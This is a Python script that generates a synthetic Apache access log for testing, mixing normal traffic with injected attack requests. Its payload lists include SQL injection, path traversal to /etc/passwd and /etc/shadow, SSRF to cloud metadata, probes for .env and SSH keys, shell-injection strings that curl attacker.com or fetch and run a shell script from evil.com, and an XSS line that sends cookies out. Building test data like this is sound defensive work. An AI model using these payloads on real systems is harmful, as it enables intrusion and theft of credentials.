#!/usr/bin/env python3
"""
Generate a realistic Apache combined-format test log with injected anomalies.
Usage: python generate_logs.py [output] [lines]
  output  default: test-apache.log
  lines   default: 10000
"""

import random
import sys
from datetime import datetime, timedelta

OUTPUT    = sys.argv[1] if len(sys.argv) > 1 else "test-apache.log"
NUM_LINES = int(sys.argv[2]) if len(sys.argv) > 2 else 10_000

MONTHS = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]

NORMAL_IPS = [
    "203.0.113.1",  "203.0.113.5",   "203.0.113.22",  "198.51.100.4",
    "198.51.100.17","192.0.2.88",    "10.0.0.15",     "172.16.0.33",
    "185.220.101.45","91.108.4.200", "35.180.22.101", "54.239.17.6",
    "66.249.66.1",  "157.240.22.35", "104.26.10.233", "151.101.1.57",
]

ATTACKER_IPS  = ["45.33.32.156", "195.54.164.12", "178.62.108.44"]
SCANNER_IP    = "80.82.77.33"
BRUTEFORCE_IP = "103.21.244.14"

NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/services",
    "/api/v1/users", "/api/v1/products", "/api/v1/orders",
    "/static/css/main.css", "/static/js/app.js", "/favicon.ico",
    "/images/logo.png", "/dashboard", "/login", "/logout",
    "/api/v1/health", "/robots.txt", "/sitemap.xml", "/privacy",
    "/terms", "/blog", "/docs", "/api/v1/search?q=widget",
]

METHODS = ["GET","GET","GET","GET","GET","POST","PUT","DELETE"]

# (status, weight)
STATUS_TABLE = [
    (200,60),(301,4),(302,3),(304,10),(400,2),(401,3),(403,2),(404,9),(500,2),(503,1)
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "python-requests/2.31.0",
    "curl/8.4.0",
]

SCANNER_UA = "Nikto/2.1.6 (Evasion: None)"

SQL_PATHS = [
    "/login?user=admin'--&pass=x",
    "/search?q=1'+OR+'1'='1",
    "/products?id=1;DROP+TABLE+users--",
    "/api/v1/users?filter=1+UNION+SELECT+username,password+FROM+users--",
    "/profile?id=1'+AND+SLEEP(5)--",
    "/items?sort=name+ASC;SELECT+SLEEP(5)--",
]

TRAVERSAL_PATHS = [
    "/../../../etc/passwd",
    "/files/../../windows/system32/cmd.exe",
    "/download?file=../../../etc/shadow",
    "/static/../../../windows/win.ini",
    "/api/v1/read?path=../../../../etc/hosts",
]

SHELL_PATHS = [
    "/ping?host=localhost|whoami",
    "/cmd?exec=ls;cat+/etc/passwd",
    "/tools/lookup?domain=google.com&&curl+http://attacker.com/$(hostname)",
    "/api/run?cmd=wget+http://evil.com/shell.sh;chmod+777+shell.sh;./shell.sh",
]

XSS_PATHS = [
    "/search?q=<script>alert(document.cookie)</script>",
    "/comment?text=<img+src=x+onerror=alert(1)>",
    '/profile?name="><script>fetch("http://attacker.com/?c="+document.cookie)</script>',
]

SSRF_PATHS = [
    "/api/fetch?url=file:///etc/passwd",
    "/api/proxy?target=http://169.254.169.254/latest/meta-data/",
    "/webhook?callback=http://internal:8080/admin",
    "/api/v1/import?source=http://127.0.0.1:9200/_cat/indices",
]

SCANNER_PATHS = [
    "/.env", "/.git/config", "/wp-admin/", "/wp-config.php",
    "/phpmyadmin/", "/admin/", "/config.php", "/.htaccess",
    "/backup.zip", "/db.sql", "/server-status", "/.DS_Store",
    "/xmlrpc.php", "/cgi-bin/test.cgi", "/adminer.php",
    "/config/database.yml", "/.ssh/id_rsa", "/etc/passwd",
]

REFERERS = ["-", "-", "-", "https://www.google.com/", "https://example.com/", "https://bing.com/"]


def pick_status():
    total = sum(w for _, w in STATUS_TABLE)
    r = random.randint(0, total - 1)
    for status, weight in STATUS_TABLE:
        if r < weight:
            return status
        r -= weight
    return 200


def fmt_dt(dt: datetime) -> str:
    return f"{dt.day:02d}/{MONTHS[dt.month-1]}/{dt.year}:{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d} +0000"


def rand_bytes(status: int) -> int:
    if status in (301, 302, 304):
        return random.randint(0, 256)
    if status >= 400:
        return random.randint(128, 1024)
    return random.randint(512, 65536)


def line(ip, method, path, status, dt, ua=None, referer=None) -> str:
    ua  = ua      or random.choice(USER_AGENTS)
    ref = referer or random.choice(REFERERS)
    b   = rand_bytes(status)
    return f'{ip} - - [{fmt_dt(dt)}] "{method} {path} HTTP/1.1" {status} {b} "{ref}" "{ua}"\n'


def generate():
    random.seed(42)
    dt = datetime(2026, 5, 1, 0, 0, 0)
    buf = []
    i   = 0

    while i < NUM_LINES:
        r = random.random()

        # ── Brute-force burst: 55 POST /login → 401 from one IP within ~9 s ──
        if i > 800 and r < 0.004 and i + 60 < NUM_LINES:
            for _ in range(55):
                dt += timedelta(seconds=random.uniform(0.08, 0.18))
                buf.append(line(BRUTEFORCE_IP, "POST", "/login", 401, dt, ua="python-requests/2.31.0"))
                i += 1
            continue

        # ── Scanner burst: 15 probes for sensitive files ──────────────────────
        if i > 400 and r < 0.006 and i + 20 < NUM_LINES:
            probes = random.sample(SCANNER_PATHS, min(15, len(SCANNER_PATHS)))
            for path in probes:
                dt += timedelta(seconds=random.uniform(0.04, 0.25))
                buf.append(line(SCANNER_IP, "GET", path, 404, dt, ua=SCANNER_UA))
                i += 1
            continue

        # ── SQL injection ─────────────────────────────────────────────────────
        if r < 0.018:
            dt += timedelta(seconds=random.uniform(0.5, 4))
            buf.append(line(random.choice(ATTACKER_IPS), "GET", random.choice(SQL_PATHS), 200, dt))
            i += 1
            continue

        # ── Path traversal ────────────────────────────────────────────────────
        if r < 0.030:
            dt += timedelta(seconds=random.uniform(0.5, 4))
            buf.append(line(random.choice(ATTACKER_IPS), "GET", random.choice(TRAVERSAL_PATHS), 403, dt))
            i += 1
            continue

        # ── Shell injection ───────────────────────────────────────────────────
        if r < 0.038:
            dt += timedelta(seconds=random.uniform(1, 5))
            buf.append(line(random.choice(ATTACKER_IPS), "GET", random.choice(SHELL_PATHS), 200, dt))
            i += 1
            continue

        # ── XSS ──────────────────────────────────────────────────────────────
        if r < 0.044:
            dt += timedelta(seconds=random.uniform(0.5, 3))
            buf.append(line(random.choice(ATTACKER_IPS), "GET", random.choice(XSS_PATHS), 200, dt))
            i += 1
            continue

        # ── SSRF / XXE ────────────────────────────────────────────────────────
        if r < 0.048:
            dt += timedelta(seconds=random.uniform(1, 5))
            buf.append(line(random.choice(ATTACKER_IPS), "GET", random.choice(SSRF_PATHS), 200, dt))
            i += 1
            continue

        # ── Normal traffic ────────────────────────────────────────────────────
        dt += timedelta(seconds=random.uniform(0.05, 2.5))
        buf.append(line(
            random.choice(NORMAL_IPS),
            random.choice(METHODS),
            random.choice(NORMAL_PATHS),
            pick_status(),
            dt,
        ))
        i += 1

    with open(OUTPUT, "w", encoding="utf-8") as f:
        f.writelines(buf)

    anomalies_approx = sum(1 for l in buf if any(
        k in l for k in ["'--", "OR '1'", "DROP TABLE", "UNION SELECT",
                          "/../", "whoami", "alert(", "169.254", "/.env",
                          "wp-config", "db.sql"]
    ))
    print(f"Done: {len(buf):,} lines -> {OUTPUT}")
    print(f"Approx. {anomalies_approx:,} anomalous lines ({anomalies_approx/len(buf)*100:.1f}%)")


if __name__ == "__main__":
    generate()
